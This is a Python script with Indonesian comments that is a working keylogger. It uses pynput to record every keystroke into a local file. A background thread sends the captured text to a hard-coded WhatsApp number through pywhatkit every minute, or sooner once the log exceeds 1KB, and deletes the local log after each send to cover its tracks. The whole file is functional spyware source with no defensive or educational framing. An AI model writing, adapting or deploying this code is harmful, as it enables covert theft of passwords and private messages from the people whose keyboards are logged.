import os
import time
from pynput.keyboard import Key, Listener
import threading
import pywhatkit as kit

# Informasi WhatsApp
log_file = os.path.join(os.path.dirname(__file__), 'massage.txt')
to_phone = "+628XXXXXXXXXX"  # Ganti dengan nomor tujuan WhatsApp
message_prefix = "Keylogger log file:\n"

# Fungsi untuk mengirim pesan WhatsApp dengan isi log file
def send_whatsapp(log_file, to_phone):
    try:
        with open(log_file, "r") as f:
            log_content = f.read()

        # Mengirim pesan menggunakan pywhatkit
        if log_content:
            kit.sendwhatmsg_instantly(to_phone, message_prefix + log_content)
            print(f"Log file '{log_file}' berhasil dikirim ke WhatsApp {to_phone}")
            return True
    except Exception as e:
        print(f"Gagal mengirim WhatsApp: {e}")
        return False

# Fungsi untuk menulis setiap tombol yang ditekan ke dalam file log
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Fungsi untuk menghentikan keylogger jika tombol Esc ditekan
def on_release(key):
    if key == Key.esc:
        return False

# Fungsi untuk memantau file log dan mengirimkan WhatsApp jika ukurannya > 1KB
def monitor_log_file(interval=60):
    last_sent_time = time.time()  # Waktu saat program mulai
    
    while True:
        current_time = time.time()
        if (current_time - last_sent_time > interval) or (os.path.exists(log_file) and os.path.getsize(log_file) > 1024):
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:  # Kirim pesan jika ada konten
                if send_whatsapp(log_file, to_phone):
                    print(f"Log file '{log_file}' berhasil dikirim dan akan dihapus.")
                    os.remove(log_file)  # Hapus file setelah dikirim
                else:
                    print(f"Log file '{log_file}' gagal dikirim.")
            last_sent_time = current_time  # Reset waktu terakhir pesan dikirim
        time.sleep(interval)  # Cek setiap interval detik

# Fungsi untuk menjalankan keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Jalankan keylogger dan monitoring secara bersamaan menggunakan threading
if __name__ == "__main__":
    t1 = threading.Thread(target=start_keylogger)
    t2 = threading.Thread(target=monitor_log_file)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
